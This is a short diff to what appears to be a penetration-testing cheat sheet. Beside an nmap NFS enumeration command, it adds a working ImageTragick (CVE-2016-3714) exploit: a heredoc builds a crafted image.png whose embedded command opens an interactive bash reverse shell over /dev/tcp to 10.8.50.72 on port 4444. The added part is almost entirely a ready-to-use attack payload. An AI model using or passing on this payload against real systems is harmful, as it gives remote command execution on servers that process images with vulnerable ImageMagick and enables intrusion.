@@ -13,6 +13,21 @@ export TERM=xterm
 ```
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
 ```
+CVE-2016–3714
+
+```
+cat > image.png << EOF
+push graphic-context
+encoding "UTF-8"
+viewbox 0 0 1 1
+affine 1 0 0 1 0 0
+push graphic-context
+image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.8.50.72/4444 0<&1 2>&1'
+pop graphic-context
+pop graphic-context
+EOF
+```
+
 
 #### Read file:
 ```python
